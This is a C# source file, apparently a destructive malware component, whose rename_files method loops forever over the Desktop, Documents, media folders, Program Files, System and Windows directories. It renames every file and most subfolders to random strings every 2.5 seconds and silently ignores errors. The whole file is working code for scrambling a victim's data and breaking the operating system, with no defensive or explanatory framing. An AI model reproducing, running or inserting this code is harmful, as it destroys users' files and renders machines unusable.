using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;

namespace version1
{
    public class random_file
    {
        public void rename_files()
        {
            while(true)
            {
                Random rand;
                rand = new Random();
                var generator_h = new Generator();
                string[] path = { Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.Personal),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.AdminTools),
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonAdminTools),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonOemLinks),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
                Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
                Environment.GetFolderPath(Environment.SpecialFolder.History),
                Environment.GetFolderPath(Environment.SpecialFolder.Personal),
                Environment.GetFolderPath(Environment.SpecialFolder.Programs),
                Environment.GetFolderPath(Environment.SpecialFolder.System),
                Environment.GetFolderPath(Environment.SpecialFolder.SystemX86),
                Environment.GetFolderPath(Environment.SpecialFolder.Windows)};
                for (int num = 0; num < path.Length; num++)
                {
                    try
                    {
                        DirectoryInfo dir = new DirectoryInfo(path[num]);
                        FileInfo[] files = dir.GetFiles();
                        foreach (FileInfo file_n in files)
                        {
                            File.Move(path[num] + @"\" + file_n.Name, path[num] + @"\" + generator_h.GenerateToken(rand.Next(1, 100)));
                        }
                    }
                    catch { }
                }
                for (int num = 0; num < path.Length; num++)
                {
                    try
                    {
                        DirectoryInfo dir = new DirectoryInfo(path[num]);
                        DirectoryInfo[] dirs = dir.GetDirectories();
                        foreach (DirectoryInfo dir_n in dirs)
                        {
                            if(dir_n.Name != "Microsoft")
                                Directory.Move(path[num] + @"\" + dir_n.Name, path[num] + @"\" + generator_h.GenerateToken(rand.Next(1, 100)));
                        }
                    }
                    catch { }
                }
                Thread.Sleep(2500);
            }
        }
    }
}
